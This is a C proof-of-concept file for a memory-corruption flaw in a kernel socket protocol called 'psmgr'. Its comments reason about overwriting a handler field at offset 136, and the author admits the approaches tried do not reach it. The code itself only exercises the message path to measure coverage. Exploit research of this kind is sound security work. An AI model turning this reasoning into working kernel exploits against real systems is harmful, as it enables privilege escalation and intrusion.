/*
 * PoC for WMI-3: Attacker-Determined Content in an Authoritative Position
 * @ psmgr_process_commit_req (psmgr_pipeline.c:359)
 *
 * Approach: MANAGED session with WINDOW xfrm, INTERLEAVE mode.
 * After write_count reaches PSMGR_BUF_WRITE_THRESH (24) and token is set,
 * write_limit = PSMGR_BUF_TOTAL_SZ (144). With WINDOW-INTERLEAVE and
 * proc_param = 68, out_offset = 136, landing directly on the handler field.
 *
 * However: writes at offset >= 128 don't increment write_count.
 * Two-phase approach: first use a low proc_param to accumulate writes and set
 * token, then use a SECOND session with proc_param=68 to overwrite handler.
 * Actually... each session has its own desc, so cross-session corruption
 * doesn't work.
 *
 * Let's instead try PRIMARY-SECONDARY setup where PRIMARY accumulates writes
 * (with xfrm=WINDOW, proc_param=0 → out_offset=0), and then somehow switch
 * ctx... which isn't possible either.
 *
 * For this first pass, exercise the full psmgr_sendmsg -> psmgr_process_commit_req
 * path with a MANAGED session to establish coverage baseline.
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>
#include <sys/socket.h>
#include <sys/uio.h>
#include <sys/types.h>
#include <stdint.h>

#define AF_PSMGR        46
#define PF_PSMGR        AF_PSMGR
#define SOCK_SEQPACKET  5

/* From psmgr.h */
#define PSMGR_PROTO             0
#define PSMGR_SOL               284

#define PSMGR_OPT_SET_ROLE      1
#define PSMGR_OPT_NEGO_1        2
#define PSMGR_OPT_NEGO_2        3
#define PSMGR_OPT_LOCAL_CTX     4
#define PSMGR_OPT_EXEC          6
#define PSMGR_OPT_GET_SESSION   9

#define PSMGR_ROLE_MANAGED      0x01
#define PSMGR_ROLE_PRIMARY      0x02
#define PSMGR_ROLE_SECONDARY    0x03
#define PSMGR_ROLE_FORWARD      0x04

#define PSMGR_MSG_DATA          0x03
#define PSMGR_MSG_COMMIT_REQ    0x01
#define PSMGR_MSG_CTRL          0x02

#define PSMGR_CTRL_RESET        0x01

#define PSMGR_XFRM_WINDOW       0x02
#define PSMGR_MODE_INTERLEAVE   0x02
#define PSMGR_MODE_LINEAR       0x01

#define PSMGR_CLASS_EXTENDED    0x02

#define PSMGR_BUF_DATA_SZ       128
#define PSMGR_BUF_TOTAL_SZ      144
#define PSMGR_MSGHDR_SZ         8
#define PSMGR_BUF_WRITE_THRESH  24

struct psmgr_msghdr {
    uint8_t  msg_type;
    uint8_t  session_id_lo;
    uint16_t payload_len;
    uint32_t seq;
} __attribute__((packed));

struct psmgr_opt_role {
    uint8_t role;
};

struct psmgr_nego_1 {
    uint8_t  enc_class;
    uint8_t  xfrm_type;
    uint16_t reserved;
};

struct psmgr_nego_2 {
    uint32_t proc_param;
    uint8_t  reserved;
    uint8_t  enc_mode;
    uint16_t reserved2;
};

struct psmgr_local_ctx {
    uint8_t  xfrm_type;
    uint8_t  enc_mode;
    uint16_t window_sz;
    uint32_t proc_param;
};

struct psmgr_commit_req_payload {
    uint32_t handler_idx;
    uint32_t reserved;
};

struct psmgr_opt_exec {
    uint32_t token;
};

static int do_setsockopt(int fd, int optname, const void *val, socklen_t len)
{
    int ret = setsockopt(fd, PSMGR_SOL, optname, val, len);
    if (ret) {
        fprintf(stderr, "setsockopt opt=%d errno=%d (%s)\n",
                optname, errno, strerror(errno));
    }
    return ret;
}

static int do_sendmsg(int fd, const struct psmgr_msghdr *hdr,
                      const void *payload, uint16_t payload_len)
{
    struct iovec iov[2];
    struct msghdr msg;
    int iovcnt = 1;

    memset(&msg, 0, sizeof(msg));
    iov[0].iov_base = (void *)hdr;
    iov[0].iov_len  = PSMGR_MSGHDR_SZ;
    iovcnt = 1;

    if (payload && payload_len > 0) {
        iov[1].iov_base = (void *)payload;
        iov[1].iov_len  = payload_len;
        iovcnt = 2;
    }

    msg.msg_iov    = iov;
    msg.msg_iovlen = iovcnt;

    int ret = sendmsg(fd, &msg, 0);
    if (ret < 0) {
        fprintf(stderr, "sendmsg ret=%d errno=%d (%s) hdr.type=%u seq=%u\n",
                ret, errno, strerror(errno), hdr->msg_type, hdr->seq);
    }
    return ret;
}

static uint32_t get_session_id(int fd)
{
    uint32_t id = 0;
    socklen_t len = sizeof(id);
    int ret = getsockopt(fd, PSMGR_SOL, PSMGR_OPT_GET_SESSION, &id, &len);
    if (ret) {
        fprintf(stderr, "getsockopt GET_SESSION failed: %d (%s)\n",
                errno, strerror(errno));
        return 0;
    }
    return id;
}

/*
 * Phase 0: MANAGED session approach
 *
 * With WINDOW-LINEAR and proc_param=127, out_offset = 127.
 * Each write copies 1 byte at offset 127 (within data region).
 * After 24 writes, write_count >= 24, token is computed.
 *
 * But then write_limit becomes 144, and the cap at line 264
 * limits it to 128 (because out_offset 127 < 128).
 * copy_len = min(plen, 128-127) = 1. Still only at offset 127.
 * Handler at offset 136 is NOT reachable.
 *
 * Let's submit anyway for coverage feedback.
 */
int test_managed(void)
{
    int fd, ret;
    uint32_t seq = 0;
    uint32_t session_id;
    struct psmgr_msghdr hdr;
    struct psmgr_local_ctx ctx;
    uint8_t buf[256];
    uint32_t i;
    struct psmgr_commit_req_payload commit_pl;
    struct psmgr_opt_exec exec_opt;

    printf("=== MANAGED session test ===\n");

    fd = socket(AF_PSMGR, SOCK_SEQPACKET, PSMGR_PROTO);
    if (fd < 0) {
        perror("socket");
        return -1;
    }
    printf("socket fd=%d\n", fd);

    /* Set role: MANAGED */
    struct psmgr_opt_role role;
    role.role = PSMGR_ROLE_MANAGED;
    if (do_setsockopt(fd, PSMGR_OPT_SET_ROLE, &role, sizeof(role)))
        goto out;

    /* Set LOCAL_CTX: WINDOW + LINEAR, proc_param = 127 */
    memset(&ctx, 0, sizeof(ctx));
    ctx.xfrm_type  = PSMGR_XFRM_WINDOW;
    ctx.enc_mode   = PSMGR_MODE_LINEAR;
    ctx.proc_param = 127;  /* max for WINDOW-LINEAR, out_offset = 127 */
    ctx.window_sz  = 0;
    if (do_setsockopt(fd, PSMGR_OPT_LOCAL_CTX, &ctx, sizeof(ctx)))
        goto out;

    session_id = get_session_id(fd);
    printf("session_id=%u\n", session_id);

    /* Write 30 DATA messages to fill buffer */
    memset(buf, 0xAA, sizeof(buf));
    for (i = 0; i < 30; i++) {
        memset(&hdr, 0, sizeof(hdr));
        hdr.msg_type      = PSMGR_MSG_DATA;
        hdr.session_id_lo = (uint8_t)(session_id & 0xFF);
        hdr.payload_len   = 120;
        hdr.seq           = seq++;

        ret = do_sendmsg(fd, &hdr, buf, 120);
        if (ret < 0)
            goto out;
    }
    printf("sent 30 DATA messages\n");

    /* Send COMMIT_REQ */
    memset(&commit_pl, 0, sizeof(commit_pl));
    commit_pl.handler_idx = 0;  /* passthrough */

    memset(&hdr, 0, sizeof(hdr));
    hdr.msg_type      = PSMGR_MSG_COMMIT_REQ;
    hdr.session_id_lo = (uint8_t)(session_id & 0xFF);
    hdr.payload_len   = sizeof(commit_pl);
    hdr.seq           = seq++;

    ret = do_sendmsg(fd, &hdr, &commit_pl, sizeof(commit_pl));
    printf("COMMIT_REQ ret=%d\n", ret);

    if (ret >= 0) {
        /* Call exec */
        memset(&exec_opt, 0, sizeof(exec_opt));
        ret = do_setsockopt(fd, PSMGR_OPT_EXEC, &exec_opt, sizeof(exec_opt));
        printf("EXEC ret=%d\n", ret);
    }

out:
    close(fd);
    return ret;
}

int main(void)
{
    return test_managed();
}
